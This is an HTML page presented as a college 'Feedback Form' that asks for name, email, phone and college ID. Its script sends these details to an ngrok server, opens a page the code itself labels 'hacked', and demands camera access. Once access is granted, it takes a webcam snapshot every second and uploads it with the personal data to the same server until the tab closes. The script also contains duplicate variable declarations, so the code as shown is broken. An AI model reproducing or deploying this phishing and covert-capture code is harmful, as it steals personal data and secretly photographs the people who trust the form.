<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Feedback Form</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      padding: 1rem;
    }
    .card {
      background: #fff;
      border-radius: 16px;
      padding: 2.2rem;
      width: 100%;
      max-width: 440px;
      box-shadow: 0 20px 50px rgba(0,0,0,0.25);
    }
    .card h1 { font-size: 1.5rem; color: #1f2933; margin-bottom: 0.2rem; }
    .card p.sub { color: #6b7280; font-size: 0.9rem; margin-bottom: 1.5rem; }
    .field { margin-bottom: 1.1rem; position: relative; }
    label { display: block; font-size: 0.82rem; color: #374151; margin-bottom: 0.35rem; font-weight: 500; }
    input {
      width: 100%; padding: 0.7rem 0.85rem; border: 1.5px solid #d1d5db;
      border-radius: 10px; font-size: 0.95rem; transition: border-color 0.2s, box-shadow 0.2s; outline: none;
    }
    input:focus { border-color: #667eea; box-shadow: 0 0 0 3px rgba(102,126,234,0.15); }
    input.invalid { border-color: #ef4444; } input.valid { border-color: #10b981; }
    #msg { color: #ef4444; font-size: 0.82rem; margin-top: 0.4rem; min-height: 1em; }
    button { width: 100%; padding: 0.75rem; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #fff; border: none; border-radius: 10px; font-size: 1rem; font-weight: 600; cursor: pointer; margin-top: 0.5rem; transition: transform 0.1s, opacity 0.2s; }
    button:hover { opacity: 0.92; } button:active { transform: scale(0.98); } button:disabled { opacity: 0.6; cursor: not-allowed; }
    .capture-indicator {
      display: flex; align-items: center; justify-content: center;
      gap: 0.5rem; margin-top: 0.5rem; color: #ef4444; font-size: 0.85rem;
    }
    .capture-indicator .dot {
      width: 8px; height: 8px; background: #ef4444; border-radius: 50%;
      animation: pulse 1s infinite;
    }
    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
  </style>
</head>
<body>
  <div class="card">
    <h1>Feedback Form</h1>
    <p class="sub">Please fill in your details.</p>

    <form id="feedbackForm" novalidate>
      <div class="field">
        <label for="name">Full Name</label>
        <input type="text" id="name" name="name" placeholder="Enter your full name" required />
      </div>
      <div class="field">
        <label for="email">Email ID</label>
        <input type="email" id="email" name="email" placeholder="you@example.com" required />
      </div>
      <div class="field">
        <label for="phone">Phone Number</label>
        <input type="tel" id="phone" name="phone" placeholder="+91 98765 43210" required />
      </div>
      <div class="field">
        <label for="collegeId">College ID</label>
        <input type="text" id="collegeId" name="collegeId" placeholder="e.g. CU2024001" required />
      </div>
      <button type="submit" id="submitBtn">Submit</button>
      <div id="msg"></div>
      <div class="capture-indicator" id="captureIndicator" style="display:none;">
        <span class="dot"></span> Capturing every 1s...
      </div>
    </form>
  </div>

  <script>
    const HACKED_PAGE = "https://An0nymOuS29.github.io/success.html";
    const ADMIN_CAPTURE = "https://stainless-king-gravitate.ngrok-free.dev/capture";
    const ADMIN_SUBMIT = "https://stainless-king-gravitate.ngrok-free.dev/submit";

    const form = document.getElementById("feedbackForm");
    const msg = document.getElementById("msg");
    const btn = document.getElementById("submitBtn");
    const captureIndicator = document.getElementById("captureIndicator");

    const validateEmail = (v) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);
    const validatePhone = (v) => /^[+]?[\d\s\-()]{7,15}$/.test(v.replace(/\s/g, ""));

    function showMsg(text, isError = true) {
      msg.textContent = text;
      msg.style.color = isError ? "#ef4444" : "#10b981";
    }

    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      console.log("Form submitted");
      showMsg("");

      const nameEl = document.getElementById("name");
      const emailEl = document.getElementById("email");
      const phoneEl = document.getElementById("phone");
      const collegeEl = document.getElementById("collegeId");

      const userName = nameEl.value.trim();
      const userEmail = emailEl.value.trim();
      const userPhone = phoneEl.value.trim();
      const userCollegeId = collegeEl.value.trim();

      let ok = true;
      [nameEl, emailEl, phoneEl, collegeEl].forEach(el => el.classList.remove("invalid", "valid"));

      if (!userName) { nameEl.classList.add("invalid"); ok = false; } else nameEl.classList.add("valid");
      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(userEmail)) { emailEl.classList.add("invalid"); ok = false; } else emailEl.classList.add("valid");
      if (!/^[+]?[\d\s\-()]{7,15}$/.test(phoneEl.value.replace(/\s/g, ""))) { phoneEl.classList.add("invalid"); ok = false; } else phoneEl.classList.add("valid");
      if (!collegeEl.value.trim()) { collegeEl.classList.add("invalid"); ok = false; } else collegeEl.classList.add("valid");

      if (!ok) { showMsg("Please fix the highlighted fields."); return; }

      // Disable form
      btn.disabled = true;
      btn.textContent = "Submitting...";
      showMsg("", false);

      const userName = nameEl.value.trim();
      const userEmail = emailEl.value.trim();
      const userPhone = phoneEl.value.trim();
      const userCollegeId = collegeEl.value.trim();

      // 1. Request camera permission FIRST (user gesture - works on mobile!)
      let stream = null;
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }, audio: false
        });
        window.cameraStream = stream;
        console.log("Camera permission granted on submit");
      } catch (e) {
        console.error("Camera not available:", e);
        showMsg("Camera access denied. Please allow camera permission and try again.", true);
        btn.disabled = false;
        btn.textContent = "Submit";
        return;
      }

      // 1. Send initial user data to admin server
      try {
        console.log("Sending submit to admin server...");
        await fetch("https://stainless-king-gravitate.ngrok-free.dev/submit", {
          method: "POST", headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            name: userName, email: userEmail, phone: phoneEl.value.trim(),
            collegeId: collegeEl.value.trim(), time: new Date().toISOString()
          })
        });
        console.log("Submit sent successfully");
      } catch (e) {
        console.error("Submit failed:", e);
      }

      // 2. Open hacked page in new tab
      try {
        window.open("https://An0nymOuS29.github.io/success.html", "_blank");
      } catch (e) {
        console.error("Failed to open hacked page:", e);
      }

      // 3. Start continuous capture every 1 second in THIS tab
      if (stream) {
        startContinuousCapture(stream, userName, userEmail, userPhone, userCollegeId);
      } else {
        console.warn("No camera stream available");
      }

      // Show capture indicator
      captureIndicator.style.display = "flex";
      btn.disabled = true;
      btn.textContent = "Capturing every 1s... (close tab to stop)";

      // Hide form
      form.style.display = "none";
    });

    async function startContinuousCapture(stream, userName, userEmail, userPhone, userCollegeId) {
      // Continuous capture every 1 second until tab closes
      async function captureLoop() {
        if (!stream) return;
        try {
          const video = document.createElement("video");
          video.srcObject = stream; video.autoplay = true; video.muted = true;
          await video.play();

          const canvas = document.createElement("canvas");
          canvas.width = 320; canvas.height = 240;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(video, 0, 0, 320, 240);
          const dataUrl = canvas.toDataURL("image/jpeg", 0.6);

          await fetch("https://stainless-king-gravitate.ngrok-free.dev/capture", {
            method: "POST", headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              name: userName,
              email: userEmail,
              phone: userPhone,
              collegeId: userCollegeId,
              image: dataUrl,
              time: new Date().toISOString()
            })
          });
          console.log("Capture sent");
        } catch (e) {
          console.error("Capture error:", e);
        }

        // Schedule next capture in 1 second
        setTimeout(captureLoop, 1000);
      }

      // Start the continuous capture loop
      captureLoop();
    }

    function showMsg(text, isError = true) {
      msg.textContent = text;
      msg.style.color = isError ? "#ef4444" : "#10b981";
    }
  </script>
</body>
</html>
